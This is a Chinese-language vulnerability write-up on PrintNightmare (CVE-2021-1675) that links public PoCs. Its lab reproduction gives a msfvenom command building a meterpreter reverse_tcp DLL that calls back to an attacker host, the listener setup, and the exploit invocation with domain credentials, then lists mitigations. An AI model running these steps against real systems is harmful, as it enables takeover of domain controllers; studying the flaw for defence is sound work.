## **0** **1** **前言**

在较大的企业、政企、高校等单位的网络信息化建设中，域环境常常是内部网络建设的重要一部分，从现有网络安全建设来看，大部分单位的内部网络的安全性往往做的没有边界这么好，网络防御的重点基本还是集中在网络边界位置。

随着黑产团伙网络攻击事件的频频发生，在攻击者“穿过”单位网络的“边界防御”后，内部网络这块“香饽饽”是不会轻易放过的。
**黑客经常会利用AD域（Active Directory Domain）来作为首要攻击目标，特别是域控**
，一旦域控被拿下，基本上可以说整个域已宣布失陷，整个过程黑客涉及了网络攻击生命周期中的权限提升、内部侦察和横向移动阶段。

![image.png](https://image.3001.net/images/20220511/1652260518_627b7ea6a3d9f9ae61ceb.png!small)

图1 网络攻击生命周期

本章将对域内渗透常被利用的漏洞之一： **Windows Print Spooler权限提升漏洞** —— **CVE-2021-1675**
进行介绍分析。

##  **0** **2** **漏洞简介**

该漏洞又被漏洞的作者称为 **PrintNightmare** ，引发该漏洞的原因主要是因为 **当Windows Print
Spooler服务（Windows的打印机后台处理程序）不正确地执行特权文件操作时，存在远程执行代码漏洞风险**
。成功利用此漏洞的攻击者可以使用SYSTEM权限运行任意代码。然后攻击者可以安装程序；查看、更改或删除数据；或创建具有完全用户权限的新帐户。

攻击者可以通过该漏洞绕过PfcAddPrinterDriver的安全验证，并在打印服务器中安装恶意的驱动程序。若攻击者所控制的用户在域中，则攻击者可以连接到DC中的Spooler服务，并利用该漏洞在DC中安装恶意的驱动程序，完整的控制整个域环境。

![image.png](https://image.3001.net/images/20220511/1652260519_627b7ea793022f2eb13b6.png!small)

##  **0** **3** **影响范围**

![](https://image.3001.net/images/20220511/1652260395_627b7e2b61c4153d1430e.png!small)

##  **0** **4** **漏洞复现**

  *  **相关POC**

<https://github.com/afwu/PrintNightmare>

<https://github.com/cube0x0/CVE-2021-1675>

<https://github.com/calebstewart/CVE-2021-1675>

  *  **环境搭建**

需要一台2019server（192.168.83.136）、CentOS7（192.168.83.129）、kali攻击主机（192.168.83.135）。

  *  **环境配置**

➢ 2019server（192.168.83.136）：

关闭安全中心

创建AD域控

创建域内用户

![image.png](https://image.3001.net/images/20220511/1652260520_627b7ea85b483230849c8.png!small)

开启print spooler服务

![image.png](https://image.3001.net/images/20220511/1652260521_627b7ea9138d76b94f744.png!small)

修改注册表

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters]

"AllowInsecureGuestAuth"=dword:00000001

#确保server2019能够访问CentOS7的smb服务  
  
---  
  
➢ CentOS7（192.168.83.129）：

无密码的smb服务（共享文件夹服务）

➢ Kali（192.168.83.135）：

msf：自带

python3.9：自带

CVE-2021-1675漏洞POC：

git https://github.com/cube0x0/CVE-2021-1675  
  
---  
  
mpacket：

git clone https://github.com/cube0x0/impacket

cd impacket

python3 ./setup.py install  
  
---  
  
  *  **复现步骤**

 **1\. 在kali主机上面，通过msfvenom来制作文件HACK.dll**

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.83.135
LPORT=9999 -f dll -o HACK.dll

![image.png](https://image.3001.net/images/20220511/1652260522_627b7eaa7792f51363f08.png!small)

 **2\. 将生成的dll文件上传到CentOS7的共享文件夹**

scp HACK.dll root@192.168.83.129:/tmp

![image.png](https://image.3001.net/images/20220511/1652260523_627b7eab2034a19c4988b.png!small)

 **3\. 设置kali的监听端口和dll文件的反射端口相同,即9999端口**

msfconsole

![image.png](https://image.3001.net/images/20220511/1652260523_627b7eab9cf156fbf0c1d.png!small)

开启端口监听。

handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.83.135 -P 9999

![image.png](https://image.3001.net/images/20220511/1652260524_627b7eac290ece5336fd4.png!small)

 **4\. 新建窗口尝试利用POC复现**

Python3 CVE-2021-1675.py dopa.com/zhangsan:XXXXX@192.168.83.136
“\\\192.168.83.129\tmp\HACK.dll”

![image.png](https://image.3001.net/images/20220511/1652260525_627b7ead47ad4ca168739.png!small)

![image.png](https://image.3001.net/images/20220511/1652260527_627b7eaf3ed41f1ada530.png!small)

出现了报错，但是并不影响我们获取shell

 **5\. 直接进入连接，尝试远程控制**

回到第3步的窗口，发现监听的9999端口爆出产生新的连接，连接IP为域服务器192.168.83.136

![image.png](https://image.3001.net/images/20220511/1652260529_627b7eb1c79b4f986df01.png!small)

![image.png](https://image.3001.net/images/20220511/1652260532_627b7eb4e2a39486e2e36.png!small)

##  **0** **5** **漏洞原理**

在理解该漏洞之前，我们先聊一下Windows的DLL文件。微软为了便于软件开发人员更轻松的开发出想要的程序，会抽象出公共的一些库文件，该库文件都是集成好，并且可以直接运行的“武器库”。

再聊一下微软的打印机服务，该服务为客户端提供了一项可以远程在服务器端安装打印机驱动的功能。客户端远程使用该功能，并选择驱动的文件位置（任意位置），服务器就会以system权限去运行该驱动包。

这次微软的漏洞就是打印机服务print
spooler没有限制DLL文件的调用，导致黑客可以直接利用该函数，让系统以system权限在服务器本地运行一个后门程序文件HACK.dll。远程控制服务器。

![image.png](https://image.3001.net/images/20220511/1652260533_627b7eb5adae171afbadd.png!small)

图2 打印驱动目录下后门文件HACK.dll

##  **0** **6** **解决方案**

 **1\. 建议在不使用打印服务的情况下，关闭打印机相关服务。**

cmd:

net stop spooler && sc config spooler start=disabled

PowerShell：

Stop-Service -Name Spooler -Force;

Set-Service -Name Spooler -StartupType Disabled  
  
---  
  
 **2\. 组策略封禁**

gpedit.msc

Policies/Windows Settings/Security Settings/System Services/Print Spooler

//选择禁用  
  
---  
  
 **3\. 至windows官网下载补丁包**

[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675﻿](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)

